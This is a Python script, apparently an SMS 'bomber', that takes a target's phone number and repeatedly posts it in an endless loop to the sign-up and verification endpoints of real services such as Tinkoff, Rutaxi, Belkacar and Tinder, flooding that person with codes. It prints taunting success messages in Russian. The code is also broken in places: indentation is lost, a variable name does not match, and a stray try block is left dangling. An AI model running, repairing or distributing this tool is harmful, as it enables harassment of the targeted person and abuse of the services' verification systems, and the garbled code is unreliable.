import threading
import time
import requests, random, datetime, sys, time, argparse, os
print ("""
╔╗──╔╗╔╗───────╔══╗╔═══╦═══╦═╗╔═╦══╗
║╚╗╔╝╠╝╚╗──────║╔╗║║╔═╗║╔═╗║║╚╝║╔╗║
╚╗║║╔╬╗╔╬╗─╔╦══╣╚╝╚╣║║║║║║║║╔╗╔╗║╚╝╚╗
─║╚╝╠╣║║║║─║║╔╗║╔═╗║║║║║║║║║║║║║║╔═╗║
─╚╗╔╣║║╚╣╚═╝║╔╗║╚═╝║╚═╝║╚═╝║║║║║║╚═╝║
──╚╝╚╝╚═╩═╗╔╩╝╚╩═══╩═══╩═══╩╝╚╝╚╩═══╝
────────╔═╝║
────────╚══╝""") 
phone = input("\033[32m Номер Бобика +")
_name = ''
for x in range(12):
_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
iteration = 10
while True:
_email = _name+f'{iteration}'+'@gmail.com'
email = _name+f'{iteration}'+'@gmail.com'
try:
	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
	print('[+] Tinkoff отправлено красава!')
except Exception as ex:
	print('[-] Tinkoff не отправлено лошара!' + str(ex))
try:	requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'phone': '+'+_phone}, headers={})
	print('[+] Rutaxi отправлено красава!')
except Exception as ex:
	print('[-] Rutaxi не отправлено лошара!' + str(ex))
try:	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '+'+_phone}, headers={})
	print('[+] belkacar отправлено красава!')
except Exception as ex:
	print('[-] belkacar не отправлено лошара!' + str(ex))
try:	requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': '+'+_phone}, headers={})
	print('[+] Тиндер отправлено красава!')
except Exception as ex:
	print('[-] Тиндер не отправлено лошара!' + str(ex))
try:
iteration += 1
print(('{} круг пройден.').format(iteration))
except:
break
